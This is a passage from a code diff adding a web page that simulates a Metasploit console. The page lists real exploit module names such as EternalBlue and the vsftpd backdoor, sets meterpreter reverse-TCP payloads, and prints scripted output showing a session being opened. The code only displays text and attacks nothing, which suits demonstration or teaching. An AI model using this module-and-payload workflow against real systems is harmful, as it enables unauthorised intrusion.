+      {t:"  Type 'help' for available commands",c:'dim'},{t:'',c:''},
+    ];
+  },
+};
+
+/* ── MSF MODULES ── */
+const MSF_MODS = {
+  'exploit/windows/smb/ms17_010_eternalblue':{desc:'EternalBlue SMB RCE',cve:'CVE-2017-0143'},
+  'exploit/multi/handler':{desc:'Generic Payload Handler'},
+  'exploit/windows/smb/psexec':{desc:'Windows Authenticated PSExec'},
+  'exploit/unix/ftp/vsftpd_234_backdoor':{desc:'VSFTPD 2.3.4 Backdoor',cve:'CVE-2011-2523'},
+  'auxiliary/scanner/smb/smb_ms17_010':{desc:'MS17-010 SMB Detection'},
+  'auxiliary/scanner/portscan/tcp':{desc:'TCP Port Scanner'},
+  'post/multi/recon/local_exploit_suggester':{desc:'Local Exploit Suggester'},
+};
+
+function handleMsfCmd(cmd){
+  if(!cmd){ addSpacer(); addMsfInput(); return; }
+  appendPromptLine(cmd, true);
+  const parts=cmd.trim().split(/\s+/); const n=parts[0].toLowerCase(); const a=parts.slice(1);
+
+  if(n==='exit'||n==='quit'){ msfActive=false; msfModule=null; addSpacer(); addInput(); scrollBottom(); return; }
+  if(n==='back'){ msfModule=null; addSpacer(); addMsfInput(); scrollBottom(); return; }
+  if(n==='clear'){ outputEl.innerHTML=''; addMsfInput(); return; }
+
+  if(n==='search'){
+    const q=a.join(' ').toLowerCase();
+    const hits=Object.entries(MSF_MODS).filter(([k,v])=>k.includes(q)||v.desc.toLowerCase().includes(q));
+    appendLines([{t:'',c:''},{t:'Matching Modules',c:'cyan'},{t:'',c:''},
+      {t:'  #  Name                                          Description',c:'yellow'},
+      {t:'  -  ----                                          -----------',c:'dim'},
+      ...hits.map(([k,v],i)=>({t:`  ${i}  ${k.padEnd(46)} ${v.desc}`,c:''})),
+      ...(hits.length?[]:[{t:`No results for '${q}'`,c:'red'}]),
+      {t:'',c:''},
+    ]);
+  }
+  else if(n==='use'){
+    const mod=a.join(' ');
+    const key=Object.keys(MSF_MODS).find(k=>k===mod||k.endsWith('/'+mod));
+    if(key){
+      msfModule=key;
+      msfOpts.PAYLOAD=key.includes('windows')?'windows/x64/meterpreter/reverse_tcp':'linux/x86/meterpreter/reverse_tcp';
+      appendLines([{t:`[*] Using payload ${msfOpts.PAYLOAD}`,c:'dim'},{t:'',c:''}]);
+    } else appendLines([{t:`[-] Module not found: ${mod}`,c:'red'}]);
+  }
+  else if(n==='info'){
+    const m=msfModule?MSF_MODS[msfModule]:null;
+    if(!m) appendLines([{t:'No module selected.',c:'red'}]);
+    else appendLines([{t:'',c:''},{t:`Name:   ${m.desc}`,c:''},{t:`Module: ${msfModule}`,c:''},{t:`Rank:   Excellent`,c:'green'},
+      ...(m.cve?[{t:`CVE:    ${m.cve}`,c:'red'}]:[]),{t:'',c:''}]);
+  }
+  else if(n==='show'&&a[0]==='options'){
+    appendLines([{t:'',c:''},{t:`Module: ${msfModule||'none selected'}`,c:'cyan'},{t:'',c:''},
+      {t:'  Name    Current Setting  Required',c:'yellow'},
+      {t:`  RHOSTS  ${(msfOpts.RHOSTS||'').padEnd(15)}  yes`,c:msfOpts.RHOSTS?'':'red'},
+      {t:`  LHOST   ${msfOpts.LHOST.padEnd(15)}  yes`,c:''},
+      {t:`  LPORT   ${msfOpts.LPORT.padEnd(15)}  yes`,c:''},
+      {t:`  PAYLOAD ${msfOpts.PAYLOAD||'(not set)'}`,c:''},
+      {t:'',c:''}]);
+  }
+  else if(n==='show'&&a[0]==='payloads'){
+    appendLines([{t:'',c:''},{t:'Compatible Payloads',c:'cyan'},
+      {t:'  0  windows/x64/meterpreter/reverse_tcp',c:''},
+      {t:'  1  linux/x86/meterpreter/reverse_tcp',c:''},
+      {t:'  2  generic/shell_reverse_tcp',c:''},
+      {t:'',c:''}]);
+  }
+  else if(n==='set'){
+    if(a[0]&&a.length>1){ msfOpts[a[0].toUpperCase()]=a.slice(1).join(' ');
+      appendLines([{t:`${a[0].toUpperCase()} => ${a.slice(1).join(' ')}`,c:'green'}]); }
+    else appendLines([{t:'Usage: set OPTION VALUE',c:'red'}]);
+  }
+  else if(n==='run'||n==='exploit'){
+    if(!msfModule) appendLines([{t:'[-] No module selected.',c:'red'}]);
+    else if(!msfOpts.RHOSTS) appendLines([{t:'[-] Set RHOSTS first: set RHOSTS <target>',c:'red'}]);
+    else appendLines([
+      {t:'',c:''},
+      {t:`[*] Started reverse TCP handler on ${msfOpts.LHOST}:${msfOpts.LPORT}`,c:'dim'},
+      {t:`[*] Connecting to target ${msfOpts.RHOSTS}:445...`,c:'dim'},
+      {t:`[+] Connection established`,c:'green'},
+      {t:`[+] Target OS: Windows 7 SP1 x64`,c:'green'},
+      {t:`[+] Sending exploit payload...`,c:'green'},
+      {t:`[+] ETERNALBLUE overwrite completed (0xC000000D)!`,c:'green'},
+      {t:`[*] Sending stage (200774 bytes) to ${msfOpts.RHOSTS}`,c:''},
+      {t:`[*] Meterpreter session 1 opened → ${msfOpts.LHOST}:${msfOpts.LPORT} at ${new Date().toLocaleString()}`,c:'green'},
+      {t:'',c:''},{t:'meterpreter > ',c:'yellow'},
+    ]);
+  }
+  else if(n==='sessions'){
+    appendLines([{t:'',c:''},{t:'Active sessions',c:'cyan'},
+      {t:'  Id  Type                     Connection',c:'yellow'},
+      {t:`  1   meterpreter x64/windows  ${msfOpts.LHOST}:${msfOpts.LPORT} -> ${msfOpts.RHOSTS||'10.10.10.55'}`,c:'green'},
+      {t:'',c:''}]);
+  }
+  else if(n==='help'){
+    appendLines([{t:'',c:''},{t:'search <term>    — find modules',c:'cyan'},
+      {t:'use <module>     — select a module',c:'cyan'},
+      {t:'info             — module details',c:'cyan'},
+      {t:'show options     — current options',c:'cyan'},
+      {t:'show payloads    — compatible payloads',c:'cyan'},
+      {t:'set KEY VALUE    — set option',c:'cyan'},
+      {t:'run / exploit    — launch module',c:'cyan'},
+      {t:'sessions         — active sessions',c:'cyan'},
+      {t:'back / exit      — navigate/quit',c:'cyan'},{t:'',c:''}]);
+  }
+  else appendLines([{t:`[-] Unknown command: ${n}. Type 'help'`,c:'red'}]);
+
+  addSpacer(); addMsfInput(); scrollBottom();
+}
+
+/* ── MAIN DISPATCH ── */
+function commitCommand(cmd){
+  histIdx=-1;
+  if(msfActive){ if(cmd) cmdHist.push(cmd); handleMsfCmd(cmd); return; }
+  appendPromptLine(cmd, false);
+  if(cmd) cmdHist.push(cmd);
+  if(cmd){
+    const parts=cmd.trim().split(/\s+/); const n=parts[0]; const a=parts.slice(1);
+    if(n==='clear') outputEl.innerHTML='';
+    else if(cmds[n]){ const r=cmds[n](a); if(r&&r.length) appendLines(r); }
+    else appendLines([{t:`bash: ${n}: command not found`,c:'red'}]);
+  }
+  addSpacer();
+  if(!msfActive) addInput();
+  scrollBottom();
+}
+
+/* ── BOOT ── */
+addInput();
+scrollBottom();
+</script>
+</body>
+</html>
